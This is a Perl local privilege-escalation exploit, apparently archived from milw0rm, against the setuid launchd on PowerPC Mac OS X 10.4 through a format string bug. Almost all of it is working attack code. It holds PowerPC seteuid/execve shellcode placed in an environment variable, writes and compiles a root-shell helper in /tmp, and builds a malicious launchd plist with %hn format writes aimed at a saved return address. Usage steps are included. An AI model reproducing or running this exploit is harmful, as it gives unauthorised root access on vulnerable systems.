#!/usr/bin/perl
#
# http://www.digitalmunition.com/FailureToLaunch-ppc.pl
# Code by Kevin Finisterre kf_lists[at]digitalmunition[dot]com
#
# Much appreciation goes to John H for all kindsa random shit like exploiting Veritas and other random things in the past
#
# core... where the hell are you fool. 
#
# This is just a vanilla format string exploit for OSX on ppc. We overwrite a saved return addy with our shellcode address.
# This code currently overwrites a saved return addy with the stack location of our seteuid() / execve() shellcode.
#
# This exploit will create a malicious .plist file for you to use with launchctl
# kevin-finisterres-mac-mini:~ kfinisterre$ launchctl load ./com.pwnage.plist
#
# In theory I guess you could also drop this in ~/Library/LaunchAgents
# 
# This was tested against OSX 10.4.6 8l127 on a 1.25GHz PowerPC G4 and a
# 500mhz PowerPC G3 running 10.4 8A428
# 
# kevin-finisterres-mac-mini:~ kfinisterre$ ls -al /sbin/launchd
# -rwsr-sr-x   1 root  wheel  80328 Feb 19 04:09 /sbin/launchd
# kevin-finisterres-mac-mini:~ kfinisterre$ file /sbin/launchd
# /sbin/launchd: setuid setgid Mach-O executable ppc
#
# ./src/SystemStarter.c:374:              syslog(level, buf);
#
# http://developer.apple.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/AccessControl.html
# "Because launchd is a critical system component, it receives a lot of peer review by in-house developers at Apple. 
#  It is less likely to contain security vulnerabilities than most production code."
# 

foreach $key (keys %ENV) {

    delete $ENV{$key};

}

#// ppc execve() code by b-r00t + nemo to add seteuid(0)
$sc = 
"\x7c\x63\x1a\x79" . 
"\x40\x82\xff\xfd" . 
"\x39\x40\x01\xc3" . 
"\x38\x0a\xfe\xf4" . 
"\x44\xff\xff\x02" . 
"\x39\x40\x01\x23" . 
"\x38\x0a\xfe\xf4" . 
"\x44\xff\xff\x02" .
"\x60\x60\x60\x60" . 
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd" . 
"\x7d\x68\x02\xa6\x3b\xeb\x01\x70" .
"\x39\x40\x01\x70\x39\x1f\xfe\xcf" .
"\x7c\xa8\x29\xae\x38\x7f\xfe\xc8" .
"\x90\x61\xff\xf8\x90\xa1\xff\xfc" .
"\x38\x81\xff\xf8\x38\x0a\xfe\xcb" .
"\x44\xff\xff\x02\x7c\xa3\x2b\x78" .
"\x38\x0a\xfe\x91\x44\xff\xff\x02" .
"\x2f\x74\x6d\x70\x2f\x73\x68\x58";

$writeaddr = 0xbffffcf8; # Saved Return addy from frame 3 
$ENV{"TERM_PROGRAM"} = "-" . pack('l', $writeaddr) . pack('l', $writeaddr+2) . "iiii" x 1 . $sc ;

$format =   
# make it more robust yourself... I'm lazy
# 0xbfff fe70
"%" . 0xbfff . "d%112\$hn" .
"%" . 0x3ed9 . "d%113\$hn" ;

open(SUSH,">/tmp/aaa.c");
printf SUSH "int main(){seteuid(0);setuid(0);setgid(0);system(\"/bin/sh\");}\n";
system("PATH=$PATH:/usr/bin/ cc -o /tmp/sh /tmp/aaa.c");

open(PWNED,">com.pwnage.plist");   

print PWNED "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
	<key>Label</key>
	<string>" . "$format" .
	"</string>
	<key>ProgramArguments</key>
	<array>
		<string>http://www.digitalmunition.com</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>\n";
close(PWNED);
print "open a new window and type - \"launchctl load ./com.pwnage.plist\"\n";
system("/sbin/launchd");

# milw0rm.com [2006-07-01]